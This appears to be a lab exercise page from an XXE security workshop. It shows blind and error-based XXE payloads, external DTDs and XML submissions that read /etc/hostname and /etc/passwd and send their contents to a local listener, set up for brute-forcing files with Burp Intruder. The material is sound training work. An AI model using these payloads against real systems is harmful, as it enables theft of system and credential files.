---
title: "Brute Force Local Files"
weight: 30
---

In this exercise we want to brute-force local files through a tool like Brup Suite Intruder. The assumption is that a Basic XXE attack will not work and so we will need to rely on a Blind XXE or Error Based attack.

In order to do this we need to have the file specified in the internal dtd (so that it can be manipulated by Intruder). We will also need to define an external dtd that has a General Entity to accept the file content and include it in the XML document.


## Blind

First the dtd found in `/home/vagrant/dtds/brute.dtd`

```xml
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:5000/?x=%file;'>">
%eval;
%exfil;
```

And what we submit:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % ext SYSTEM "http://127.0.0.1:5000/brute.dtd">
  %ext;
]>

<name></name>
```

![](/static/img/brute_results.png)

## Error Based

The contents of the dtd in `/home/vagrant/dtds/brute_error.dtd`

```xml
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % ext SYSTEM "http://127.0.0.1:5000/brute_error.dtd">
  %ext;
]>

<name></name>
```

![](/static/img/brute_error_results.png)
